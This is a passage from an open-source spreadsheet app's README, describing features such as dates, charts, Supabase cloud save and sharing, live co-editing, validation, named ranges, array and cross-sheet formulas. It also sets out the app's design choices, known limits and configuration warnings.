**What changes, on purpose:** `007` is text now, so it sorts after every number, and charts and conditional
formatting do not count it as a number. Sheets already saved in the browser need nothing done: the raw text was
always stored as typed, so the zeros come back the moment they are opened.

**Limits:**
- **A CSV opened in Excel** — we write `0812345678` into the file as it is, but Excel double-click-opening a
  CSV converts it to a number itself and drops the zero. That is out of our hands (CSV has nowhere to say what
  type a field is); use `.xlsx`, or Excel's Data → From Text.
- **What was already lost stays lost** — an `.xlsx` exported or imported before the fix holds `812345678` as a
  number, with no zero to give back. (Live data from a CSV source follows the same rule since #36.)
- **`=SUM(A1:A3)` over text still adds up number-looking text**, where Excel gives 0 — that is #38, separate
  because it changes the totals of sheets that already exist.
- "Text" is a cell format, so like every format it does not sync live while co-editing; an apostrophe is part of
  the cell, so it does.

### 📅 Dates and times

Type `2024-01-15` and you get **a date**, not text that looks like one. Its value is the serial Excel
uses (`2024-01-15` is 45306, noon is .5), so `=A2-A1` is a count of days, `=A1+30` is the date a month
on, and an exported file opens in Excel with **date cells** rather than 45306 or text.

| Typed | Value | Shown |
|---|---|---|
| `2024-01-15` | 45306 | `2024-01-15` |
| `2024-01-15 14:30` | 45306.6042 | `2024-01-15 14:30` |
| `09:45` | 0.40625 | `09:45` |
| `=DATE(2024,1,15)` · `=TODAY()` | a serial | a date, formatted for you while the cell is still General (as Excel does) |
| `=NOW()` | a serial plus the time | a date and time, in the viewer's own time zone |

<p align="center"><img src="public/screenshots/en/54-dates.png" width="700" alt="Dates in a sheet: subtracted into days, a date and time in a column widened to fit, a time on its own, and =DATE(2024,3,1) in the formula bar while the cell shows 2024-03-01 and the format menu reads Date"></p>

- **ISO forms only** (`yyyy-mm-dd`). `03/04/2024` is March in one country and April in another, and a
  wrong guess moves a date a month without a word, so every other layout stays the text it is
  (Buddhist-era years and Thai month names are #82).
- **Excel's 1900 system**, including the 29 February 1900 that never happened (Excel inherited it from
  Lotus 1-2-3), so a date typed here is the same number in Excel on every day there is.
- **Opening an `.xlsx`** keeps the time; a time-only cell is `09:45` (it used to become `1899-12-30`),
  and a cell the file formats as `dd/mm/yyyy` shows that way and goes back out as `dd/mm/yyyy`.
- **Exporting `.xlsx`** writes real date cells with a date format. **CSV** writes ISO text
  (`2024-01-15`): a CSV is read by programs, and ISO is the one form none of them misreads.
- **Charts and pivots** label with the date as the grid shows it, not 45306. **Sorting** is by time.
  **Dragging the fill handle** from `2024-01-15`, `2024-01-16` carries on a day at a time.
- The **number format** menu has "Date", "Date and time" and "Time"; any number can be shown as a
  date, and the choice round-trips through `.xlsx`.
- **A date is never cut off.** A column too narrow for it shows `###`, as Excel does, rather than
  `2024-01-1…`, which reads as a date — just the wrong one. The whole date stays in the tooltip and in
  what a screen reader hears. Typing a date and time into a column still at its default width widens it.

Round-tripped against the PaynEat ERP's real import template: open, edit one cell, export, reopen with
ExcelJS. Every sheet keeps its row and column count and every date cell keeps its value (the writer used
to pad each sheet with empty rows to the grid's size, so a 5-row sheet came back with 20).

**Limits:**
- **Formula results are not all formatted for you.** `=A1+30` with a date in A1 shows the serial until
  you pick "Date" (Excel infers it from the formula; this does not yet). Only formulas starting with
  `TODAY`, `NOW` or `DATE` are formatted automatically.
- **Other date layouts stay text**, whether typed, pasted, in a CSV or from live data: `15/01/2024`
  cannot be subtracted until it is rewritten as ISO, or until #82.
- **A file's date validation rules are not imported.** The app has no rule of that kind yet, so one is
  dropped on open, as before (the ERP template's "after 2020-01-01", for one). The dates in the cells
  are unaffected.
- A file's date format shows in the Gregorian calendar; a Buddhist-calendar code (`[$-th-TH,107]`) still
  shows the Common Era year (#82).
- A date format is a cell format, so it does not sync live between collaborators yet (the existing limit
  on every format). The date itself lives in the cell, so that syncs.

### 📊 Charts from the sheet

Select a range, hit **Charts** in the format bar, and pick **bar, line or pie**. The chart lands on
the grid just under the range it reads: **drag the bar at its top to move it, the bottom-right
corner to resize it**, and switch its type or delete it from the chart itself.

![Charts](public/screenshots/en/20-charts.png)

**A second chart steps clear of the first.** Both are built from the same range, so both land in the
same place. The old step was one column — 112px against a chart 300px wide — which left the new chart
covering nearly two thirds of the old one: a pile you only find by dragging the top one off. It now
steps past the chart's real width, summing actual column widths rather than dividing, and cascades
downwards instead once it runs out of room on the right.

**A chart stores which cells it reads, never the numbers**, so it redraws from the computed values
on every render: edit a cell and the bars move on the same frame. That also keeps it right after a
sort, an insert or a formula change, none of which it has to know about.

**Headers and labels are worked out for you** — select the whole of `A1:D6`. Which columns actually
carry numbers decides the rest: a first row counts as series names only where those columns hold
text instead of a number, and a first column of text beside them becomes the category labels.

Deliberate details:

- **The value axis always includes zero**, so a bar's length means what it looks like instead of
  making a 2% difference look like double.
- **A non-numeric cell leaves a gap** rather than letting the line run straight through it, which
  would invent readings that were never taken.
- **A column with nothing numeric in it is skipped** (a "notes" column, say) instead of being drawn
  as a flat line at zero.
- Charts live in the sheet, so they sit in the **undo/redo history** and **shift with inserted or
  deleted rows and columns**.
- **A whole drag is one undo step**, not one per pixel the mouse moved — otherwise a chart dragged
  across the sheet buries the last real edit under a hundred entries nobody can ctrl-Z back through.
- **A chart can't be dragged off the sheet**: it is clamped to the area the grid scrolls to, because
  something you cannot scroll back to is simply gone.
- **Resizing stops at a size that can still be read**, and a chart dragged wider gets more room to
  draw in rather than the same picture floating in more white space.
- **A second chart built from the same range steps clear of the first** instead of landing on top of
  it and looking like one chart that changed type.
- **A chart's position is pinned to a cell, not to pixels** — insert a column to its left and the
  chart travels with the data instead of staying put over a different set of numbers.
- **The legend names whatever suits the kind** — series for a bar or line, categories for a pie,
  since a pie colours one series slice by slice and naming the series there labels the wrong thing.

**Drawn as hand-written SVG, with no charting library** — a bar, line and pie between them are a few
dozen lines of geometry, against a dependency that would outweigh the whole feature.

**A pie picks which series it draws** — a pie can only show one, so a range with several gets a
chooser under the chart rather than being handed "whichever was leftmost". If the chosen series later
goes away, it falls back to the first rather than drawing an empty circle.

**Charts go into both exports** — into the `.xlsx` at the cell they are anchored to, and into the PDF
in order under the table, each captioned with the range it reads. Under the table rather than where
they sit on screen: a paginated table has already moved the cells somewhere else, so "the same place"
means nothing on a page.

**A chart in the exported `.xlsx` is a real chart, not a picture.** Open it in Excel, change a
number, and the chart follows — it holds *references to the cells* rather than an image of them.
ExcelJS writes no chart XML at all (`addImage` is its entire drawing API), so the OOXML chart parts
are written by hand and spliced into the finished package; see `xlsxChartXml.ts` and
`xlsxCharts.ts`. If that splice ever fails the export falls back to embedding pictures, because a
package with a dangling relationship is one Excel calls corrupt and refuses to open — a much worse
outcome than a chart that has stopped updating.

**Not supported:** charts in the PDF are still pictures (jsPDF has no chart primitive). A pie still
draws one series at a time. The chart parts carry no colour or theme styling, so whichever app opens
the file applies its own defaults.

### ☁️ Cloud save (bring your own backend)

**Off by default, deliberately.** ExcelToGo is an open-source project, **not a hosted service**.
Running one database for everyone who uses the app would make the maintainer a data controller with
the obligations that carries, and would reverse the property the rest of the app is built on: your
spreadsheet never leaves your browser.

If you want it, **bring your own Supabase project**. Set two variables and the button appears:

```bash
NEXT_PUBLIC_SUPABASE_URL=https://xxxx.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=...
```

![Cloud save](public/screenshots/en/23-cloud-save.png)

Run every migration, in order, against your project once first —
[`0001_workbooks.sql`](supabase/migrations/0001_workbooks.sql) creates the table and the
**row-level security** policies that keep one account's workbooks away from another's, and
[`0002_sharing_and_realtime.sql`](supabase/migrations/0002_sharing_and_realtime.sql) adds sharing
and authorises the live channel, and
[`0003_versions.sql`](supabase/migrations/0003_versions.sql) keeps the last twenty versions of each
workbook. [`0005_pin_search_paths.sql`](supabase/migrations/0005_pin_search_paths.sql) pins the
`search_path` on four functions that were missing it — found by Supabase's own database linter
after these files were applied to a real project, because the test only asked it of `security
definer` functions and these four are not. It asks it of every function now.
[`0006_usage_landing_viewed.sql`](supabase/migrations/0006_usage_landing_viewed.sql) adds `landing_viewed`
to the usage counter's list, and a test checks that the list in SQL matches the app's, event for event.
[`0007_revoke_unneeded_execute.sql`](supabase/migrations/0007_revoke_unneeded_execute.sql) takes EXECUTE on the
policies' helper functions away from signed-out callers — after scoping six policies to `authenticated`, so a
signed-out request still gets an empty answer rather than an error.

- **The browser talks to your Supabase directly**, never through this app's server, so whoever
  deploys it never sees their users' spreadsheets.
- **Sign in with an emailed link** — no password for this app to store or check.
- **A save that would overwrite a newer one asks first.** Two devices on one account is the ordinary
  case, and last-write-wins with no warning loses work silently.
- **A workbook written by a newer version is refused rather than half-read**, because half-reading
  it drops whatever the newer format added and the user finds out by noticing work missing.

**Leave it unset** — the default, and what the public site does — and the button doesn't exist, the
cloud code is unreachable, and the ~250KB Supabase client **is never downloaded**. That was checked
by counting the chunks the browser actually requests, not assumed.

**Sharing works now** — the owner adds an email, and whoever signs in with that address on the same
Supabase project can open and edit the workbook. There is no read-only role, and saying so is better
than implying one: a read-only share the app cannot enforce in the grid would be a promise made in
the database and broken in the browser.

> **⚠️ Sharing is only safe if your Supabase project enforces email confirmation.** Access is tied to
> an *email address*, and the database trusts the address in the sign-in token. With confirmation
> off, anyone holding the anon key (which is public) can sign up through Supabase's API as an invited
> address — with a password, even though the app's own sign-in is a magic link — and open the
> workbook. **Before sharing, open the Supabase dashboard → Authentication → Sign In / Providers →
> Email and check** that **Confirm email** is on (self-hosted: `GOTRUE_MAILER_AUTOCONFIRM=false`),
> that **Secure email change** is on (changing an account's address to an invited one needs
> confirming too), and that any other provider you enable only hands over addresses it has verified.
> The app cannot see these settings, so it cannot check them for you. Details in [SECURITY.md](SECURITY.md).

**Version history works now** — every save over a workbook keeps the copy it replaced, the last
twenty per workbook. The panel says *open*, not restore: looking at a version and deciding is a
different act from replacing today's work with it, and one button doing both would be the more
dangerous one wearing the safer one's label. Saving afterwards is an ordinary save, which snapshots
what was there first — so even taking an old version is undoable.

Rows appear there only through a database trigger. There is no insert policy, deliberately: a client
that could write to that table could forge a history, and a history that can be forged is not one.
Renaming a workbook does not make a version, or a rename would push a real one out of the window.

**Not supported:** automatic sync (you press save).

### 👥 Editing together

Save a workbook to your Supabase project, share it with someone, press **"Join the live session"**
in the cloud panel, and everyone who can open that workbook sees the others type, with a coloured
dot for where each person's cursor is.

It rides on **Supabase Realtime broadcast** rather than Postgres changes: a keystroke is not worth a
row. Messages travel between the browsers that are connected right now and are never stored, so your
database still holds saved workbooks and nothing else.

**What it deliberately does not do — written down, because silence here costs more:**

- **It is not a CRDT.** Two people typing into one cell in the same second leaves one value, and the
  one who lost **is told**, out loud, rather than finding out later. The rule is "later wins, ties
  broken by client id", which every participant computes from the same two facts without asking
  anyone.
- **Clocks differ**, so the winner may not be whoever actually typed last. The alternative is a
  server sequence number, which means a server, which this app does not have.
- **Row and column inserts are not merged.** They move every cell below or right of them, so a cell
  message crossing one on the wire would land in the wrong place. The client making the change saves
  to the cloud first and then asks the others to reload — a visible reload beats two screens quietly
  drifting apart.
- **The cell you have open is never overwritten mid-word.** An arriving edit waits for the editor to
  close. Watching your own typing vanish as you do it is what makes people stop trusting a shared
  document.
- **Your undo does not erase their work.** This one was nearly missed: undo restores a snapshot of
  the whole workbook, so a colleague's edit that arrived after that snapshot was taken is not in it.
  Press Ctrl+Z to take back your own last word and their work goes with it, silently, while the undo
  looks like it did exactly what it should. Remote values are now written into the stored snapshots
  too.
- **Formatting, charts and comments are not synced live** — those still go through save and reopen.
- **There is no screenshot in this section.** The panel only exists once a real Supabase project is
  attached, so it cannot be captured from a deployment without a backend, and a mocked-up image
  would be a claim rather than evidence.

**The channel is authorised, not merely obscure.** This was got wrong first. A Supabase Realtime
topic is public unless the client marks it private and the database says who may join, and the first
version of this feature did not: row-level security protected the *saved* workbook while every
keystroke travelled on a topic anyone holding the anon key could subscribe to — and the anon key is
in the JavaScript, for everyone. The workbook id is a uuid, so it was hard to exploit, which is
exactly the kind of thing that stays wrong for years. The topic is now private and
[`0002_sharing_and_realtime.sql`](supabase/migrations/0002_sharing_and_realtime.sql) decides who may
listen and who may speak, from the same membership that decides who may open the workbook at all.

The topic's name is what the policy reads to find the workbook, so a test reads the SQL and pins the
two together — neither language can see the other, and a drift would look like "live editing stopped
working" rather than like a format change.

Everything arriving on the channel **is still checked before it is used**, because authorisation
says who may speak, not that what they said is well formed. A `row` of `-1` reaches an array index,
and a `raw` that is not a string reaches the formula engine.

### 💬 Cell comments

Select a cell, hit **Comment** in the format bar, and write a note. A commented cell gets an **amber
corner**; hover to read it.

![A note on a cell](public/screenshots/en/22-cell-comment.png)

**One cell at a time**, because a note is something said about *a* cell. Allowing a block would mean
either fanning it out into a note per cell or inventing a note about a rectangle, and neither is the
thing anybody meant.

**Emptying the text deletes the note** rather than keeping an empty one: an amber corner on a cell
with nothing behind it promises information that isn't there.

**Notes follow edits.** Insert a row above and the note moves down with its cell; **delete the row a
note is on and the note goes with it**. That is deliberately the opposite of what a chart's anchor
does — a chart is placed *near* cells, a note is written *about* one, so re-pointing it at whatever
slid into the gap would attach an explanation to data it never described.

**They export as real Excel notes** (`cell.note`), so they open as ordinary comments in Excel or
Google Sheets, and notes are read back out of imported files — including ones Excel wrote as rich
text rather than as a plain string.

**Not supported:** an author name or timestamp (the text is all that's kept); threaded replies as in
Google Sheets; and **a note on an empty cell is lost when the file is read back in** — the file
itself is correct and Excel shows the note, but ExcelJS attaches notes only to cells present in its
sheet model, and a cell with no value isn't. The loss is in the reader, not the writer.

### 🛡 Data validation

Select a range, hit **Limit** in the format bar, and say what those cells will accept: one of a
list, a number in a range, or a length cap. A cell carrying a rule gets a **thin emerald ring**,
and a list rule turns it into a dropdown while you type.

**Typing something outside the rule is refused rather than saved and flagged.** A warning on a cell
that *already holds* the wrong thing is a note about a mistake; refusing the write is the mistake
not happening. The refusal is **announced to screen readers**, because a keystroke that does
nothing and says nothing is indistinguishable from a broken keyboard.

The reason it exists: a shared sheet always ends up with `เหนือ`, `ภาคเหนือ`, `north` and ` เหนือ`
in one column, and then a `SUMIF` quietly counts one of them.

**An empty value always passes** — clearing a cell is not entering a wrong one, and a rule that
refuses deletion turns a typo into something you cannot undo by hand. **A formula always passes**
too, because there is no result to check yet; refusing it would mean a validated column could hold
no formulas at all, which costs more than the rule is worth.

Rules **move with inserted and deleted rows**, the way comments do, and go **into and out of
`.xlsx` as real data validation** (`list`, `decimal`, `textLength`) — a file that arrived from
Excel with a dropdown on it still refuses the wrong value here.

**Stated limits:** no "date between" and no custom-formula rule yet. **A list whose options contain
a comma, or one longer than 255 characters, is not written to the file**: Excel's inline form has
no escape for a comma, and its answer is to point at a range of cells elsewhere in the workbook,
which would mean this app inventing a hidden sheet inside somebody's file. Dropping the dropdown
beats writing it truncated. And a **template's** own rules are still a separate thing from the
person's — deliberately, since "unlock this template" ought to release the template's rules too.

A dropdown pointing at a range on *another sheet* (`=Ref!$A$2:$A$50`, `'ใบเสนอราคา'!$A$1:$A$5`) reads that
sheet, hidden or not. If the file has no such sheet, the cell gets no dropdown at all rather than options from
somewhere else. The options are still captured as a list when the file is opened (editing `Ref` afterwards does
not update them), and a list given as a named range (`=Units`) is still not read.

**Known bugs, not fixed yet:** a **template's**
dropdowns are written back without checking the 255-character limit, so a long list produces a file that
breaks the spec. ~~Empty input rows past the first 20 are cut off~~ — fixed
([#43](https://github.com/SuruchBoss/ExcelToGo/issues/43), [#10](https://github.com/SuruchBoss/ExcelToGo/issues/10)): a sheet
opens down to its last input cell, and the ERP's draft 0 gets `Items` 200, `Locations` 50 and `OpeningBalance` 200 rows as
contracted. A hidden or protected sheet comes back out as an ordinary one. A template keeps only its
`list` rules — `whole`/`decimal`/`textLength`/`date` on a protected sheet are dropped. All of it has to be
fixed before the [PaynEat ERP import template](docs/payneat-erp.en.md).

### 🏷 Named ranges

`=SUMIF(Sales,">1000")` against `=SUMIF(B2:B500,">1000")`: the second makes every reader go and look
at what is in column B, and gives the ones who guess wrong no way to find out. The formula bar is
where a spreadsheet explains itself, and an address explains nothing.

![Naming a range, and limiting what a cell will accept](public/screenshots/en/43-sheet-rules.png)

<sub>One frame, both halves: the formula bar reads `=SUM(Sales)` · the cells that name stands for are lit as
its precedents, because the engine has already substituted it · and the thin emerald rings down column A are
the cells carrying a rule about what may go in them.</sub>

Select a range, hit **Names** in the format bar, type a name, and use it. **Thai names work**, which
is the whole reason the feature is here: Thai characters used to fall into the tokenizer's
"unknown character, skip it" branch one at a time, so `=SUM(ยอดขาย)` was read as `SUM()` and
answered zero in silence.

A name that cannot be used says why, next to the box: one that is **also a cell address** (`B2`)
would leave a formula unable to tell them apart; one with **a space or a character the tokenizer
cannot read** would exist and be unusable; function names and reserved words (`SUM`, `TRUE`, `R`,
`C`); and duplicates, case-insensitively.

**Names are substituted at compile time, not at evaluation time** — that is what keeps the
dependency graph honest, since precedents are read off the syntax tree and the tree therefore has
to hold the real rectangle before anything looks at it. The formula cache is keyed by the name
table's fingerprint as well as the text, so redefining a name recompiles the formulas that read it
instead of serving the tree built around the old rectangle. Tests that deliberately break both of
those are what say it works.

**Names follow inserted and deleted rows**, through the same rewriter the formulas use, and **do
not shift when filled** — as in Excel. Both fall out of `shiftFormulaRefs` only ever rewriting cell
and range tokens.

They go **into and out of `.xlsx` as real defined names**, so a workbook that arrived from Excel
with names on it still computes.

**Stated limits:** **a name belongs to the sheet that defines it, not to the workbook.** Excel has
both kinds; this has the second. The reason is mechanical rather than principled —
`computeSheet(sheet)` takes a sheet, and fifteen call sites pass one with no workbook in reach. A
name whose *target* points at another tab still works, which covers the lookup-table case. On
export, **two tabs claiming the same name collide and the first one wins**, because a file's
defined names are workbook-wide and renaming the second would produce a file whose formulas point
somewhere nobody asked for. And **deleting a name leaves the formulas holding it**, reading
`#NAME?` rather than being rewritten back to addresses: quietly rewriting work nobody asked to have
rewritten is worse, and `#NAME?` is both findable and undoable.

### 🌡 Conditional formatting

Colours that follow the numbers, instead of being painted on once and going stale the moment a
value changes. Select a range, hit **Conditional formatting** in the format bar, and add one of
five rules:

| Rule | What it does |
|---|---|
| **Compare to a number** | `>`, `<`, `≥`, `≤`, `=`, `≠`, between — highlights the cells that qualify |
| **Text contains** | Substring search, case-insensitive, Thai included |
| **Top / bottom N** | Ranks within the selected range; ties are all included rather than cut off arbitrarily |
| **Colour scale** | Two or three stops across the range's spread — a whole column readable at a glance |
| **Data bar** | A bar inside the cell, always measured from zero so negatives stay on the scale |

![Conditional formatting](public/screenshots/en/18-conditional-format.png)

Rules are re-evaluated from the computed values on every render rather than stored as colours, so
editing a number repaints it on the same frame. Because the rules live in the sheet, they sit in
the **undo/redo history** and **shift with inserted or deleted rows and columns**.

They're written into `.xlsx` as genuine Excel conditional formatting (`cellIs`, `containsText`,
`top10`, `colorScale`, `dataBar`) and read back on import, so a file that already had rules opens
here showing what it shows in Excel.

**Deliberate limits:** Excel's icon sets, above-average and time-period rules aren't supported —
on import they're skipped rather than converted into something they aren't. Rule colours **don't
reach the PDF export** (neither do fills or bold, which it doesn't carry either). And where
several rules hit one cell, **the lower rule wins** — the opposite of Excel's top-priority-wins
order. That's chosen so a rule you just added visibly does something instead of silently nothing.

### ⌨️ The Excel keyboard

Somebody who opens a spreadsheet moves their hands before they read anything — `Ctrl+Down` comes
before the first word of the page. A grid that answers by moving one row has told them it is a
mock-up.

| Key | What it does |
|---|---|
| `Ctrl`/`Cmd` + arrow | Jump to the edge of the data: run to the end of the block if the next cell has something in it, skip the gap to the next filled cell if it does not |
| `Shift` + arrow | Drag the far corner of the selection with you (the corner opposite the anchor is the one that moves) |
| `Ctrl` + `Shift` + arrow | Extend all the way to the edge of the data in one press |
| `Home` / `Ctrl+Home` | Start of the row / back to A1 |
| `End` / `Ctrl+End` | Last filled cell in the row / the corner of everything used |
| `PageUp` / `PageDown` | A screen at a time, **measured in pixels rather than a row count**, because an imported file's rows are not all the same height |
| `Ctrl+A` | The table you are standing in; press again for the whole sheet, the way Excel does |
| `Ctrl+Space` / `Shift+Space` | The whole column / the whole row the selection touches; both together, the sheet |
| **Freeze panes** (format bar) | Everything above and left of the cursor stays put while the rest scrolls. The split lives on the sheet, so it survives a reload, goes into undo, follows a row inserted above it, and travels in the `.xlsx` both ways |
| `Ctrl+Enter` | Put the cell the cursor is on into everything selected, in one undo step — references shift as they would in a drag-fill, because a formula that kept pointing at the anchor's row would fill a column with the same wrong number |
| `Tab` / `Shift+Tab` · `Enter` / `Shift+Enter` | Right/left · down/up |
| `F2` · `Delete` · `Escape` | Edit in place · clear the selection · cancel |

The view **follows the cursor in both axes**, which is not a nicety here: `Ctrl+Down` can move five
thousand rows in one press, and a row outside the window is not in the DOM at all, so it cannot be
asked to scroll itself into view — the position has to be worked out.

> **The bug found while building this, and why the key handler is not on the cells:** `onKeyDown`
> used to sit on each `<td>`. `Ctrl+Down` scrolls, the windowing unmounts the very cell holding
> focus, focus falls to `<body>`, and every key after that is the browser's own scrolling rather
> than the grid's — the app looks frozen while the values underneath are still correct. The handler
> now lives on the scroller, with an effect that takes focus back **only from `<body>`**, never
> from the formula bar or a panel that legitimately has it.

**And then nothing on screen said any of it existed.** Every key above worked, and a run through
the public build the way a first-time visitor would found no help button, no shortcut list, and no
mention of `Ctrl+` anywhere outside the undo and redo tooltips. A feature only its author knows
about is not a feature. `Ctrl`/`Cmd`+`/` or `F1` opens the sheet, as does the keyboard button at the
end of the sheet-tab strip:

<p align="center"><img src="public/screenshots/en/35-shortcuts.png" width="760"></p>

Not `?`, which is what most web apps use: the grid starts editing a cell on any printable character,
so `?` with the sheet focused — which is nearly always — would put a question mark in a cell instead
of opening anything.

**The list is a second copy of what the handlers do**, which is the shape of every stale claim this
project has shipped. So a test reads the handler's source and compares: a key handled and not listed
fails, a key listed and handled nowhere fails, and if the extraction itself ever stops matching, a
third test catches that too — otherwise both of the others would pass by finding nothing. All three
were confirmed by breaking the code on purpose and watching them go red.

Two more things the gates could not have told me, both found by looking:

- The button went in the toolbar first. At 1363px that row fitted its thirteen buttons with nothing
  to spare, and one more pushed 42px past the edge, clipping the language toggle on every laptop
  under 1440. It lives at the end of the sheet-tab strip instead, which had the room.
- `npm run check:a11y` was green the whole time, because axe only ever saw `/app` as it loads and
  this dialog does not exist until you press something. Run against it open, axe found two serious
  violations inside it — headings at 2.62:1, and a scrolling list no keyboard could reach. Both are
  fixed, and **the gate now opens the dialog and checks it too**, so the next one gets caught by CI
  rather than by me remembering to look.

### 🧮 Formulas that answer with a whole table (array formulas)

Most formulas answer with one value. Some answer with a *shape* — `=UNIQUE(B2:B10)` has as many
answers as there are distinct categories, which nobody knows while typing it. So those answers
**spill into the cells beside them**. A spilled cell is tinted, because what is in it is not its
own: it belongs to a formula in another cell, and it disappears the moment that formula does.

<p align="center"><img src="public/screenshots/en/40-array-spill.png" width="900"></p>

| Formula | What it does |
|---|---|
| `SEQUENCE(rows, cols, start, step)` | A counted block of numbers, with no dragging to fill |
| `TRANSPOSE(range)` | Rows become columns |
| `UNIQUE(range)` | Each value once, in the order it first appears |
| `SORT(range, col, order)` | Sorted **without moving the source rows**, unlike the column-header sort · `order` takes Excel's `1`/`-1` or `TRUE`/`FALSE` |
| `FILTER(range, include, if_empty)` | Only the rows whose condition is true |

**Operators work across a range too.** `A1:A9>50` is nine answers, not one, and `SUM(A1:A3*2)`
multiplies every cell before adding them. Both used to collapse to the first cell silently, which
is the worst of the three possible behaviours because the answer *looked* right. Two ranges of
different shapes give `#VALUE!` rather than a guess.

**It refuses rather than half-fitting.** Anything in the way — one cell is enough — or the edge of
the sheet, and the formula is `#SPILL!` and **nothing at all is written**. Half an array left on the
sheet would be worse than none, because those values would look like data. Type over a spilled cell
and the formula becomes `#SPILL!` at once, the way Excel does it.

**It no longer costs the whole sheet.** This section used to carry a warning that any sheet holding
an array recomputed in full on every keystroke, because an array writes into cells *outside* the set
marked dirty and a deleted one has to clear them again. The bail-out was honest and expensive: one
`SEQUENCE` in a corner made every edit anywhere a full pass.

Spill regions are now part of the closure, walked in both directions. Typing into a spilled cell
marks its anchor dirty, because the array's landing ground is no longer clear; an anchor going dirty
marks every cell it filled, because the array may come back shorter. The map is carried between
passes and emptied only where an array is about to run again, so a shrinking array leaves nothing
behind. One keystroke on a sheet that also holds an array, median of nine, same machine:

| formula rows | before | after |
|---|---|---|
| 200 | 3.07 ms | 0.85 ms |
| 1,000 | 8.72 ms | 2.34 ms |
| 3,000 | 26.42 ms | 2.25 ms |

The last row is the point: the cost stopped following the size of the sheet. Ten tests check that
the incremental answer is identical to a cold recompute — including a run of seven consecutive
edits, because each pass builds on the last one's snapshot and an error there compounds instead of
showing up once.

> In an exported `.xlsx` the formula is written at the anchor, so a version of Excel that knows
> dynamic arrays spills it again and an older one shows a single value.

### 🔗 Formulas across sheets

`=Sheet2!A1` used to be `#SYNTAX!`. The app has had tabs, and a pivot that reads its source sheet,
since early on — but every sheet was an island as far as a formula was concerned, and a real `.xlsx`
with a cross-sheet formula in it imported as an error.

```
=ยอดขาย!A1 + ยอดขาย!A2          unquoted Thai names
='ยอดขาย Q1'!A1:B5              quoted, for a name with a space
=SUM(Sheet2!A1:A10)             a range, matched however either side capitalised it
```

The reference travels the whole way — tokenizer, AST, parser, evaluator, dependency graph,
structural shifts and rename — and three parts of that were harder than they look:

**Order in the tokenizer.** `Sheet2` on its own matches the identifier rule and would be read as a
function name; `A1` in `A1!B2` matches the cell rule. Both would be wrong and **neither would fail
loudly** — the formula would simply mean something else. The qualified form is matched first and
emitted as one token, prefix included.

**Staleness, where a test found the bug.** A sheet whose own cells are untouched is still out of
date when a sheet it reads has moved, and the identity cache is exactly where that goes unnoticed —
the object is the same. The first version recorded which foreign *sheet* it had read, which catches
one level and stops: with C reading B and B reading A, editing A leaves B's source untouched and C
hands back a stale number. It now records the foreign *computed result*, which is a fresh object
whenever it was really recomputed and whose retrieval re-runs that sheet's own staleness check
first — one comparison carries the whole chain.

**Cycles that span sheets** end in `#CIRCULAR!` rather than an infinite descent. Within a sheet the
evaluator already catches re-entry per cell; Sheet1 → Sheet2 → Sheet1 recurses a level above that,
so the resolver holds the set of sheets currently being computed.

Renaming a tab rewrites the formulas that named it, quoting or unquoting as the new name needs.
Inserting a row in one sheet moves `Sheet2!A5` everywhere and leaves every bare `A5` alone, because
those name the sheet they are written on. A sheet that does not exist is `#REF!`, and comes back to
life if someone creates one by that name.

**One way to compute, not ten** (#58, #95). The grid has always read other sheets, but the CSV, PDF and
`.xlsx` exports, pivots, sort and the filter's announcement computed a sheet as if it were alone: a
cell showing 70 on screen was `#REF!` in the file and missing from the pivot. Worse, the identity
cache kept that result and later handed it back to the grid, so **the screen itself turned to
`#REF!`/฿0.00** after an export or a sort. Every path now goes through one `computeTab(sheet, sheets)`,
a test fails if anything outside the engine calls `computeSheet` bare, and the cache keeps each result
together with what it read from other sheets, so it can be checked every time — not only while it is
still among the last four computed.

### 🔍 See what a formula is about

Select a cell holding a formula and the cells it reads are outlined on the grid, with the ranges
written out beside the formula bar.

![What a formula reads](public/screenshots/en/41-precedents.png)

This exists for one specific bug, and it is the most expensive one in this project's history:
`C2:C4` and `C2:D4` differ by one character, both compute, neither errors, and the wrong total is
noticed a week later by somebody else. The range picker stops that when a formula is *written*.
Nothing stopped it when a formula is *read* — you had to hold the addresses in your head and
compare them against the sheet.

The dependency graph already worked this out; it is how one edit recomputes three cells instead of
nine thousand. What was missing was showing the person the same answer.

- **The ranges are written out in words as well as shaded.** A coloured ring tells a sighted person
  which cells a formula is about and tells a screen reader nothing — and `C2:C4` and `C2:D4` turn
  out to be easier to tell apart read out than shaded in.
- **A reference to another sheet is dropped rather than drawn here.** The engine flattens
  `Sheet2!A1` into the same key as a local `A1`, because it only needs to know *that* a formula is
  stale. Colouring A1 on this sheet for it would be a lie told confidently; the label says another
  sheet is involved instead.
- **A range too large to mean anything is refused.** `=SUM(A:A)` reads a million cells, and
  outlining a million cells is the screen turning one colour. The size is counted *before* the set
  is built, so a whole-column reference does not allocate a million entries on the way to being
  declined.
- **Not shown while the editor is open**, where the text changes on every keystroke and the range
  picker is already doing this job better.

### 🖱️ The fill handle

The first thing anyone does to a spreadsheet is drag the corner. This app had the corner grip —
touch uses it to pull a selection out — and nothing behind it on a mouse.

<p align="center"><img src="public/screenshots/en/37-fill-handle.png" width="820"></p>

```
5, 10        → 15, 20, 25        a constant gap
10, 8        → 6, 4, 2           downwards
1, 4, 9      → 1, 4, 9           repeated, not extrapolated
0.1, 0.2     → 0.3, 0.4          not 0.30000000000000004
จ, อ         → พ, พฤ, ศ
พ.ย., ธ.ค.   → ม.ค., ก.พ.        wrapping the year
Q3           → Q4, Q1, Q2
Item 08      → Item 09, Item 10  keeping the padding
=A1*2        → =A2*2, =A3*2      moved, never extended
```

Thai lists come first in that table because this app does. `จ อ พ` is a week to the people who will
use it, and continuing `Mon Tue` but not `จ อ` would be building for somebody else.

**Two deliberate refusals.** A run whose gap is not constant is repeated rather than extrapolated —
Excel fits a trend line to 1, 4, 9, and a wrong guess in a spreadsheet is a number nobody questions.
And a drag that wanders diagonally picks one axis, because filling both would overwrite a rectangle
nobody asked for.

`Ctrl+D` and `Ctrl+R` do the same thing from the keyboard, taking the selection's first row or
column as the source — and they are the only way to reach any of this without a pointer, which
matters after the accessibility work. The shortcut sheet's drift test caught them the moment they
were added, which is what it is for.

The grip is split by pointer type rather than shown to everyone: a finger cannot sweep a range any
other way, so touch keeps it for selecting. And the fill commits on release rather than filling
live, which matters for undo as much as for nerves — one drag is one step back, not one per cell.

### 🔎 Find and replace

`Ctrl+F` is reflex, and it did nothing here — which became *more* conspicuous, not less, the moment
a shortcut sheet went in advertising "the same keys as Excel".

<p align="center"><img src="public/screenshots/en/36-find-replace.png" width="820"></p>

It searches the **raw text, not the displayed result**, and the panel says so rather than leaving
